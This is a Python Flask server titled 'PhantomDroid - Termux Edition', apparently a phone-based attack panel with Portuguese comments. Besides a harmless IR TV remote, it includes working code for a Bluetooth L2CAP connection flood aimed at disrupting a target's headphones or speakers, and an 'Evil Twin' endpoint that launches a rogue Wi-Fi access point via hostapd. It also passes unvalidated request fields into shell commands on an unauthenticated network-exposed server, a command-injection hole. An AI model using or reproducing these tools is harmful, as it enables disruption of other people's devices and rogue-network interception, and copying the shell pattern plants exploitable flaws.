"""
PhantomDroid - Termux Edition
Roda no Termux com: python server.py
Acesse no navegador: http://<seu-IP>:8080

Requer:
  pkg install python termux-api
  pip install flask
  (Instale o app Termux:API na Play Store também)
"""

import json
import os
import socket
import subprocess
import threading
import time
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# ─────────────────────────────────────────────
#  UTILS
# ─────────────────────────────────────────────

def run_cmd(cmd, timeout=15):
    """Executa comando shell e retorna stdout/stderr."""
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True,
            text=True, timeout=timeout
        )
        return {"ok": result.returncode == 0,
                "out": result.stdout.strip(),
                "err": result.stderr.strip()}
    except subprocess.TimeoutExpired:
        return {"ok": False, "out": "", "err": "Timeout"}
    except Exception as e:
        return {"ok": False, "out": "", "err": str(e)}


def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


# ─────────────────────────────────────────────
#  ROTAS PRINCIPAIS
# ─────────────────────────────────────────────

@app.route("/")
def index():
    return render_template("index.html", local_ip=get_local_ip())


@app.route("/api/status")
def status():
    return jsonify({"status": "online", "ip": get_local_ip()})


# ─────────────────────────────────────────────
#  IR REMOTE
# ─────────────────────────────────────────────

# Códigos NEC pré-definidos para TVs populares
IR_CODES = {
    "samsung_power":    {"freq": 38000, "pattern": "4500,4500,560,560,560,560,560,1690,560,560,560,560,560,560,560,560,560,560,560,1690,560,1690,560,560,560,1690,560,1690,560,1690,560,1690,560,1690,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,47250"},
    "samsung_vol_up":   {"freq": 38000, "pattern": "4500,4500,560,560,560,560,560,1690,560,560,560,560,560,560,560,560,560,560,560,1690,560,1690,560,560,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,560,560,560,560,560,560,1690,560,560,560,560,560,560,560,560,560,1690,560,1690,560,1690,560,560,560,1690,560,1690,560,47250"},
    "samsung_vol_down": {"freq": 38000, "pattern": "4500,4500,560,560,560,560,560,1690,560,560,560,560,560,560,560,560,560,560,560,1690,560,1690,560,560,560,1690,560,1690,560,1690,560,1690,560,1690,560,560,560,1690,560,560,560,560,560,560,560,1690,560,560,560,560,560,1690,560,560,560,1690,560,1690,560,1690,560,560,560,1690,560,1690,560,47250"},
    "lg_power":         {"freq": 38000, "pattern": "9000,4500,560,560,560,1690,560,560,560,560,560,560,560,560,560,560,560,560,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,47250"},
    "sony_power":       {"freq": 40000, "pattern": "2400,600,1200,600,600,600,1200,600,600,600,600,600,1200,600,600,600,600,600,600,600,600,600,600,600,47250"},
    "philips_power":    {"freq": 36000, "pattern": "889,889,889,2667,889,889,889,889,889,2667,889,889,889,889,889,889,889,889,889,2667,889,47250"},
}

@app.route("/api/ir/codes")
def ir_codes():
    return jsonify(list(IR_CODES.keys()))

@app.route("/api/ir/send", methods=["POST"])
def ir_send():
    data = request.json or {}
    preset = data.get("preset")
    freq = data.get("freq")
    pattern = data.get("pattern")

    if preset and preset in IR_CODES:
        freq = IR_CODES[preset]["freq"]
        pattern = IR_CODES[preset]["pattern"]

    if not freq or not pattern:
        return jsonify({"ok": False, "err": "Informe freq e pattern ou escolha um preset"}), 400

    cmd = f"termux-infrared-transmit -f {freq} {pattern}"
    result = run_cmd(cmd, timeout=10)
    return jsonify(result)

@app.route("/api/ir/check")
def ir_check():
    result = run_cmd("termux-infrared-frequencies", timeout=5)
    if result["ok"] and result["out"]:
        return jsonify({"ok": True, "frequencies": result["out"]})
    return jsonify({"ok": False, "err": "IR não suportado ou Termux:API não instalado"})


# ─────────────────────────────────────────────
#  WIFI SCANNER / EVIL TWIN
# ─────────────────────────────────────────────

@app.route("/api/wifi/scan")
def wifi_scan():
    result = run_cmd("termux-wifi-scaninfo", timeout=20)
    if result["ok"] and result["out"]:
        try:
            networks = json.loads(result["out"])
            return jsonify({"ok": True, "networks": networks})
        except json.JSONDecodeError:
            return jsonify({"ok": False, "err": "Falha ao parsear resultado", "raw": result["out"]})
    return jsonify({"ok": False, "err": result["err"] or "Sem resultado. Instale Termux:API"})

@app.route("/api/wifi/info")
def wifi_info():
    result = run_cmd("termux-wifi-connectioninfo", timeout=10)
    if result["ok"] and result["out"]:
        try:
            info = json.loads(result["out"])
            return jsonify({"ok": True, "info": info})
        except Exception:
            return jsonify({"ok": False, "err": "Falha ao parsear"})
    return jsonify({"ok": False, "err": result["err"]})

@app.route("/api/wifi/evil_twin", methods=["POST"])
def wifi_evil_twin():
    """
    Evil Twin requer root + hostapd + dnsmasq.
    No Termux sem root, apenas explica como configurar com termux-hotspot ou hostapd.
    """
    data = request.json or {}
    ssid = data.get("ssid", "FreeWiFi")

    # Verifica se tem root
    root_check = run_cmd("su -c 'echo ROOT_OK'", timeout=5)
    has_root = root_check["ok"] and "ROOT_OK" in root_check["out"]

    if not has_root:
        return jsonify({
            "ok": False,
            "err": "Root necessário para criar Evil Twin",
            "tip": f"Com root: instale hostapd e dnsmasq via pkg, e configure SSID '{ssid}'"
        })

    # Com root: tenta criar AP via hostapd
    hostapd_conf = f"""
interface=wlan0
driver=nl80211
ssid={ssid}
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
    conf_path = "/data/data/com.termux/files/home/hostapd.conf"
    with open(conf_path, "w") as f:
        f.write(hostapd_conf)

    result = run_cmd(f"su -c 'hostapd {conf_path} &'", timeout=5)
    return jsonify({"ok": True, "msg": f"AP '{ssid}' iniciado (requer hostapd instalado)", "detail": result})


# ─────────────────────────────────────────────
#  BLUETOOTH DEAUTH (L2CAP FLOOD)
# ─────────────────────────────────────────────

bt_flood_active = False
bt_flood_thread = None

def _l2cap_flood(target_mac, duration, results):
    """Envia conexões L2CAP PSM 1 repetidamente para o alvo."""
    global bt_flood_active
    end_time = time.time() + duration
    count = 0
    errors = 0

    while bt_flood_active and time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_L2CAP)
            sock.settimeout(0.5)
            sock.connect((target_mac, 1))
            sock.close()
            count += 1
        except Exception:
            errors += 1
            # Erros são esperados — o alvo rejeita conexões mas fica sobrecarregado
        time.sleep(0.05)

    results["count"] = count
    results["errors"] = errors
    bt_flood_active = False

@app.route("/api/bt/scan")
def bt_scan():
    result = run_cmd("termux-bluetooth-get-adapters", timeout=5)
    devices_result = run_cmd(
        "termux-bluetooth-scanmode scannable; sleep 8; termux-bluetooth-get-adapters",
        timeout=15
    )
    # Tenta via bluetoothctl também
    bctl = run_cmd("bluetoothctl -- scan on & sleep 8 && bluetoothctl -- devices", timeout=20)
    return jsonify({
        "ok": True,
        "adapters": result["out"],
        "scan": bctl["out"] or devices_result["out"],
        "tip": "Dispositivos visíveis no modo discoverable"
    })

@app.route("/api/bt/deauth", methods=["POST"])
def bt_deauth():
    global bt_flood_active, bt_flood_thread

    data = request.json or {}
    target = data.get("mac", "").strip()
    duration = int(data.get("duration", 30))

    if not target:
        return jsonify({"ok": False, "err": "MAC do alvo obrigatório (ex: AA:BB:CC:DD:EE:FF)"}), 400

    if bt_flood_active:
        return jsonify({"ok": False, "err": "Flood já em andamento. Pare primeiro."}), 400

    # Valida MAC
    mac_parts = target.split(":")
    if len(mac_parts) != 6:
        return jsonify({"ok": False, "err": "MAC inválido"}), 400

    bt_flood_active = True
    results = {}
    bt_flood_thread = threading.Thread(
        target=_l2cap_flood, args=(target, duration, results), daemon=True
    )
    bt_flood_thread.start()

    return jsonify({
        "ok": True,
        "msg": f"L2CAP flood iniciado → {target} por {duration}s",
        "tip": "O alto volume de requisições de conexão interfere na caixa de som/fone conectado"
    })

@app.route("/api/bt/stop", methods=["POST"])
def bt_stop():
    global bt_flood_active
    bt_flood_active = False
    return jsonify({"ok": True, "msg": "Flood parado"})

@app.route("/api/bt/status")
def bt_status():
    return jsonify({"active": bt_flood_active})


# ─────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────

if __name__ == "__main__":
    ip = get_local_ip()
    print(f"""
╔══════════════════════════════════════╗
║       PhantomDroid - Termux          ║
╠══════════════════════════════════════╣
║  Acesse no navegador:                ║
║  http://{ip}:8080           ║
║  http://localhost:8080               ║
╚══════════════════════════════════════╝
""")
    app.run(host="0.0.0.0", port=8080, debug=False)
